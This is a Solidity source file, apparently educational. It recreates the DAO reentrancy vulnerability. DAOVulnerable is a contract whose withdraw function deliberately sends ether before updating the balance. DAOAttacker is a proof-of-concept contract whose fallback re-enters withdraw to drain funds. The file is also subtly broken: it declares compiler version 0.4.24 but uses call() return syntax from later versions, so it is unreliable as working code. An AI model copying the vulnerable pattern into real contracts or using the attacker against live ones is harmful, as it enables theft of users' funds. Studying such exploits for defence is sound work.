// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

/**
 * @title DAOVulnerable - Based on The DAO Hack (2016)
 * @dev Recreation of the vulnerability that led to $60M ETH theft
 * Source: Historical vulnerability from The DAO hack
 */
contract DAOVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABILITY: Classic reentrancy - The DAO hack pattern
    // External call before state update allows recursive withdrawals
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount);

        // BUG: External call BEFORE balance update
        // Attacker contract can call withdraw() again in fallback
        (bool success,) = msg.sender.call.value(_amount)("");
        require(success);

        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title DAOAttacker - Proof of concept attacker
 */
contract DAOAttacker {
    DAOVulnerable public dao;
    uint256 public count;

    constructor(address _dao) public {
        dao = DAOVulnerable(_dao);
    }

    function attack() public payable {
        dao.deposit.value(msg.value)();
        dao.withdraw(msg.value);
    }

    // Reentrancy callback
    function () external payable {
        if (address(dao).balance >= msg.value && count < 10) {
            count++;
            dao.withdraw(msg.value);
        }
    }
}
